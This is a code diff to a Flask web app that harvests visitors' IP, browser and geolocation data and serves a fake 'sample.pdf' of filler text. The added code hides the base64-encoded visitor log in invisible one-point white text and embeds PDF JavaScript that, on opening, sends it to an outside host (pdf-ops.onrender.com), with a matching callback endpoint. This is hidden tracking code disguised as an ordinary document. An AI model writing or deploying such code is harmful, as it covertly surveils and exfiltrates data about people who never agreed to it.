@@ -3,9 +3,12 @@ import logging
 import json
 import os
 import requests
+import base64
 from faker import Faker
 from io import BytesIO
 from reportlab.pdfgen import canvas
+from reportlab.lib.colors import white
+import PyPDF2
 
 app = Flask(__name__)
 
@@ -28,7 +31,6 @@ def get_ip_geolocation(ip):
         response = requests.get(f"https://ipinfo.io/{ip}/json")
         if response.status_code == 200:
             data = response.json()
-            # Extract latitude and longitude from the 'loc' field if available.
             loc = data.get("loc")
             if loc:
                 lat_str, lon_str = loc.split(",")
@@ -39,7 +41,7 @@ def get_ip_geolocation(ip):
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
 
-# HTML page with a styled download button and embedded JavaScript to capture extensive client-side data.
+# HTML page with a styled download button and embedded JavaScript to capture client-side data.
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -244,7 +246,7 @@ def download():
     client_data['longitude'] = lon if lon is not None else ""
     client_data['ip_geolocation'] = geo_data  # Entire JSON from ipinfo.io
     
-    # Log all the gathered data in JSON format.
+    # Create a comprehensive log message.
     log_message = {
         'ip': ip,
         'user_agent': user_agent,
@@ -255,6 +257,11 @@ def download():
         'tls_metadata': tls_metadata
     }
     logging.info(json.dumps(log_message))
+    
+    # --- Steganographic Embedding with Markers ---
+    # Encode the complete log_message in base64 and wrap it with markers.
+    encoded_log = base64.b64encode(json.dumps(log_message).encode('utf-8')).decode('utf-8')
+    encoded_log_with_markers = "<<BASE64 START>>" + encoded_log + "<<BASE64 END>>"
     
     # Generate a PDF using ReportLab and Faker.
     buffer = BytesIO()
@@ -269,12 +276,56 @@ def download():
     text_object = p.beginText(100, 670)
     text_object.textLines(fake_text)
     p.drawText(text_object)
+    
+    # Render the hidden payload in white, extremely small text.
+    p.setFont("Helvetica", 1)
+    p.setFillColorRGB(1, 1, 1)  # White text on white background (invisible)
+    p.drawString(1, 1, encoded_log_with_markers)
+    
     p.showPage()
     p.save()
     buffer.seek(0)
     
-    # Send the PDF as a file download.
-    return send_file(buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
+    # --- Enhanced Multi-Stage Logging via Embedded JavaScript ---
+    # The embedded JavaScript defines a variable with the hidden payload and attempts a callback to your hosted endpoint.
+    try:
+        pdf_reader = PyPDF2.PdfReader(buffer)
+        pdf_writer = PyPDF2.PdfWriter()
+        for page in pdf_reader.pages:
+            pdf_writer.add_page(page)
+        js_code = f"""
+        // Embedded JavaScript for multi-stage logging.
+        var hiddenPayload = "{encoded_log_with_markers}";
+        try {{
+            var req = new XMLHttpRequest();
+            req.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent(hiddenPayload), true);
+            req.send();
+        }} catch(e) {{}}
+        app.alert("PDF opened. This event has been logged.");
+        """
+        pdf_writer.add_js(js_code)
+        new_buffer = BytesIO()
+        pdf_writer.write(new_buffer)
+        new_buffer.seek(0)
+        final_pdf = new_buffer
+    except Exception as e:
+        logging.error(f"Error embedding JavaScript in PDF: {e}")
+        # If JavaScript embedding fails, fall back to the original PDF.
+        final_pdf = buffer
+    # --- End of JavaScript Embedding ---
+    
+    # Send the final PDF as a file download.
+    return send_file(final_pdf, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
+
+@app.route('/pdf_callback', methods=['GET'])
+def pdf_callback():
+    """
+    Endpoint to receive callback events from the PDF when it is opened.
+    Logs the hidden data received from the embedded JavaScript.
+    """
+    hidden_data = request.args.get('data', '')
+    logging.info("PDF callback triggered with data: " + hidden_data)
+    return "Callback logged", 200
 
 @app.route('/logs')
 def display_logs():
